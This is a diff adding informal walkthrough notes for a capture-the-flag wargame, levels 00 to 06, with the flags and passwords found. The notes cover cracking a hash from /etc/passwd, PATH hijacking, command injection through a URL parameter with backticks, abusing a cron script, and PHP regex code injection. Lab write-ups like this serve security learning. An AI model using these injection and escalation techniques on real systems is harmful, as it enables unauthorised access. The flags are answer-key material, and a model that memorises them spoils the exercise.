@@ -1,0 +1,109 @@
+on own terminal: ssh level00@{ip} -p 4242
+specifically my version: ssh level00@localhost -p 60023
+
+nice links:
+https://www.dcode.fr/
+john the ripper
+gdb
+cloudshark
+pcap reader
+scp
+
+==================================================
+
+LEVEL00:
+video says FIND this first file that can run only as flag00
+
+find / -user flag00
+2 file have rights 2 read-> cat /usr/sbin/john -> cdiiddwpgswtgt -> dcode.fr -> 
+	NOTTOOHARDHERE
+
+su flag00 -> psswd in lowercase
+
+flag: x24ti5gi3x0ol2eh4esiuxias
+
+su level01 -> flag;
+
+
+==================================================
+
+
+LEVEL01:
+cat /etc/passwd -> flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash ->
+42hDRfypTqqnw -> john_the_ripper (coz video) -> create file with contents: any_user_name:hash ->
+john file -> check passwd -> abcdefg -> su flag01 passwd -> getflag
+
+flag: f2av5il02puano7naaf6adaaf
+
+su level02 -> flag
+
+
+==================================================
+
+
+LEVEL02:
+scp -P 60023 level02@127.0.0.1:/home/user/level02/level02.pcap pepega.pcap
+tshark -r pepega.pcap
+tshark -r pepega.pcap -z"follow,tcp,ascii,0" or same but hex
+passwd: ft_waNDReL0L
+flag: kooda2puivaav1idi4f57q8iq
+
+
+
+==================================================
+
+
+LEVEL03:
+its a binary saying exploit me
+usr/bin/env echo Exploit me is what it does
+int /tmp we can create an echo of our own which is what we do
+create echo with getflag inside
+add /tmp/ to path: export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+(the rest is old path)
+dont forget chmod 777 on new echo
+done, level03 not launches getflag
+flag: qi0maab88jeaj46qoumi7maus
+
+
+
+==================================================
+
+
+LEVEL04:
+Read the code
+netstat -ano -p tcp -> somthings going on at 4747
+curl 'localhost:4747/level04.pl?x=`getflag`'
+token : ne2searoevaevoem4ov4ar8ap
+
+
+
+==================================================
+
+
+LEVEL05:
+find -name 'level05' from root
+-> ./var/mail/level05
+cat it
+it says: */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+check da script: ls -l /usr/sbin/openarenaserver
+owned by flag05
+check da folder 
+
+mkdir /opt/openarenaserver/pepe_dir
+getflag > /opt/openarenaserver/pepe_dir/pepe_flag
+
+flag: viuaaale9huek52boumoomioc
+
+
+==================================================
+
+
+LEVEL06:
+shitty php script and an excutable
+php script changing and printing stuff through regexp
+executable uses the script and a file as an arg
+create file that matches regexp:
+/tmp/pepe: echo '[x ${`getflag`}]'
+launch binary with file
+warning will give token
+flag: wiok45aaoguiboiki2tuin6ub
